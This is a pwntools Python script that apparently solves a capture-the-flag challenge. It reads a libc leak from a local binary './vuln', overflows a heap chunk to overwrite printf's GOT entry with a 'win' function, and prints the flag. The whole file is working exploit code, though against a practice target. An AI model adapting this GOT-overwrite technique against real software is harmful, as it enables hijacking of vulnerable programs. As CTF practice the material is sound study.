from pwn import *
import sys

context.binary = elf = ELF("./vuln")
rop = ROP(elf)
libc = ELF("./libc.so.6")
io = process("./vuln")


if len(sys.argv) == 2:
    if sys.argv[1] == "debug":
        context.terminal = ["tmux", "splitw", "-h"]
        gdb_commands = """
            break *0x0000000000401290
        """
        gdb.attach(io, gdb_commands)


# *************** EXPLOIT PART *************** #

print(io.recvuntil(b"Libc leak: "))
leak = int(io.recvuntil(b'\n').strip().decode("ascii"), 16)

payload = b""

padding = b"A" * 24
chunk_info = p64(0x21)
padding2 = b"B" * 8
overwrite = p64(elf.got["printf"])

payload = padding + chunk_info + padding2 + overwrite

# *************** EXPLOIT END *************** #

io.sendline(payload)
io.sendline(p64(elf.sym["win"]))
print("Flag: ", io.recvline().decode("ascii"))

io.interactive()
